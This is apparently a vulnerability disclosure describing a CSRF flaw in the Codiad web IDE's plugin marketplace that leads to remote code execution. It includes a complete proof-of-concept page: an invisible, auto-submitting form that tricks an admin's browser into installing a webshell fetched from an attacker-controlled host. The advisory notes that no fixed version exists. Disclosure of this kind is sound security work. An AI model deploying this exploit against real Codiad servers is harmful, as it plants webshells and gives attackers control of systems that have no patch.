## Summary
A Cross Side Request Forgery (CSRF) vulnerability was found in Codiad. The request to download a plugin from the marketplace is only available to admin users and it isnâ€™t CSRF protected. This might cause admins to make a vulnerable request without them knowing and result in an RCE.

## Product
Codiad from v1.7.8.

## Impact
An malicious link sent to the an admin can result in a webshell on the server.

## Steps to reproduce
```
<html><head></head>
<body>
<form style="opacity: 0;" action="http://[Codiad-url]/components/market/controller.php?action=install&type=&name=Manually&repo=http://evilWebSite/webshell/webshell.zip?a=" method="GET">
<button>submit</button>
</form>
<script>document.querySelector('form').submit();</script>
</body></html>
```

### Expected result:
A webshell from ```http://evilWebSite/webshell/webshell.zip``` will be downloaded to the server.

## Remediation
There is no fixed version of Codiad.
